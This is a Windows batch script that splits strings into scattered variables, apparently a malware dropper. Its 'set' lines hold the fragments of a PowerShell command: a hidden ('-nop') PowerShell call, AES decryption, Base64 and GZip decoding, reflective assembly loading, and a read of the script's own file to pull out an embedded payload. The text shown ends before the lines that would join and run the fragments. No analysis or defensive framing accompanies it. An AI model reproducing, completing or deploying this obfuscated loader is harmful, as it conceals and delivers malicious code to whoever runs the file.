@echo off
set "SeEnSSPhMU=nd"
set "hpiHKoOArQ=\v"
set "GwzhDTNcfA=Wi"
set "mOrIAOVsrH=y "
set "YYJOtDtGcc= /"
set "YlqLFfsCwy=he"
set "lELPgXEuxH=po"
set "JdrCwvcqVh=1."
set "caZdXKMFAQ=co"
set "lmUsiFFNzs=rs"
set "RcxCyWbldi=in"
set "YskwlIDXvw=em"
set "maqkFeopQI=Po"
set "iezRNvcugC=we"
set "hOJVmqwDGk=\W"
set "RHTopfsQvQ=ll"
set "jXlQTOulYn=rS"
set "RUjTarAfml=we"
set "aCKvhspCjF=0\"
set "plIoQjJgLW=Sy"
set "uRIIHnDQzj=ll"
set "sRVeIFExnV=xe"
set "wYNXaHFIFM=st"
set "wYQRCRUuSI=ow"
set "pkAGRwKdpx=s\"
set "mMbiWFuAJK=he"
set "FLLpPJgyrP=do"
set "rcImEkJokU=ws"
set "RkpYuYKtGA=.e"
set "hMSpFkqCas=32"
set "SklSqcoOPJ= C"
set "nntEPmfARw=:\"
set "enYHUvKscy=py"
set "OXZRQNTkYa=cd"
set "dZdWtGvWHq= %~dp0"
set "LzIGfniRvU=1..-"
set "rMlhqViszG=;$PY"
set "VqRUsQGEHE=16] "
set "MwGdEmsyot=, (,"
set "tjBSxDWmeF=O.Me"
set "XHmkreRkdu=ispo"
set "DCuKhbuoMO=[]] "
set "YUfYsTXqyp=]::C"
set "QUEgEhTRmr=aroz"
set "sMxtmQHpxb=ress"
set "sxPOeQnEIY=ment"
set "kZOqGAdNLy='')("
set "VkrqdsXiMH=Syst"
set "QcoobJSMWX=Disp"
set "JUKTsNrYlF=  $I"
set "cDKFfRWUdA=:: '"
set "tpTBeNmQGQ=)($A"
set "vQjNlDDQZJ=comp"
set "WmgSPeMsjs=ypto"
set "KRCzoJzQlp=n ''"
set "VJCgTOvYaQ=m(, "
set "cZdjFLgqht=Secu"
set "oWMnxfzYKX=y.Pa"
set "VFXSCqcCIM=iron"
set "rJToURQHKx= = ["
set "iMtwsAGcIn=Q = "
set "pqDIAzyebv=3); "
set "vNzexlhBqD=em.C"
set "ZKkzvmDPLz=ddin"
set "qrEyXsHddd=raph"
set "iMVCVDwVjV=] -j"
set "lQMMWMTUaw=ionM"
set "tjxifkWjbf=Ax.I"
set "iGvDLCmMAk=m.IO"
set "SfyLDmVAsY= = $"
set "nInLiUencJ=le  "
set "ZTjfrVnItz=)) {"
set "hZIKBAMfgf=IoO3"
set "gIiTTXdQUO=$mkz"
set "FsgXRuOjFa=flec"
set "vmgSYvpIFw=ecry"
set "QCGMItmykv=..-1"
set "SKqHlODBKK=[IO."
set "BEBmPxpEFh=ptog"
set "NyNzOPftOy='oPV"
set "sMffRsuqrl=-nop"
set "cbXsPuMQBQ=File"
set "STKXzJKhfS=ddin"
set "aZkqIFmhDs=)))"
set "bVsAvhUrGH=.Com"
set "UICwkeDYGn=th('"
set "hCBxzUCJrw=KVep"
set "ulolYgIhdo=e = "
set "PUatvLMXhg=OKn "
set "NxIsbCsaGr=bstr"
set "Tswolwwppk=lBlo"
set "bSayCmPVvx=in $"
set "CdlaIjEkjO='txe"
set "GPXVxzIjMO=pres"
set "yVUpUiXEWu=HO3I"
set "YrTIowGGYo=PKCS"
set "cgjzEbZlZx=-joi"
set "kGSGjSrIeh= = N"
set "SiayFrAgpP= '')"
set "OgkDWHkyfq=-1.."
set "ZPolUhafYP=g = "
set "LSvfRuaFkm=tsWi"
set "pUqAVZRUVf=.Cry"
set "oBiuDUulgU=..-1"
set "LsIgpwgHEV=jQ ="
set "EnQvszyZxY=AM ="
set "kVIPiwojXl=ne);"
set "JoqhfmIuhQ=nirt"
set "ndAggYhzOx=$nfE"
set "mFXABaQknF=yste"
set "hFoBveBnZf=ew-O"
set "MJjYYLIzSA=am;$"
set "vzPhTuknRm=1] -"
set "oEpEOnPywD=rtS4"
set "hPGGzVsHYo=BC;$"
set "NJNlUKzUfn=ozh."
set "AZDKMxOrFJ=n ''"
set "lJVDuVMUFh=grap"
set "NXgKGguRAx=ion."
set "LfWbGLcxTu=);$D"
set "KdbSEivcqG=ct S"
set "KBLhTHelOC=t Sy"
set "CUOPzQhrRe=hy.A"
set "PXCCugITRr=join"
set "hVltIcVVqa=ateD"
set "KNIqZGGlxt=tryP"
set "OCfyQTZdrB=).Sp"
set "ZqyxBTHjKU=y.Cr"
set "zQLmAsmcYU=Conv"
set "gjeTtqaUFF=Q, 0"
set "GKMFtzuoaV=YI.D"
set "TdXbcVArrz=[Env"
set "unBonbYznj=.Mod"
set "LoYwCYIwaF=7kGw"
set "RfXAYOKbpD=::De"
set "lYGMqaZWtf=;$gM"
set "QweHvfHEnh=.Cop"
set "zWVmltiYRa=CuSj"
set "OJYJmGwLcL=JaV "
set "jUwllUldVY=('%~f0'"
set "EpBuBsYOxY=('%*'"
set "KYgMuLKXhZ=ach "
set "nDadDZPEUK=.Dis"
set "WHUbCncjMx=esaB"
set "JHgwYFGmRy=eam("
set "aQyGWJOGda=Secu"
set "OUksvXqohS=);$n"
set "ouiJjkudAE=rt]:"
set "BOsmMEbNnv=yste"
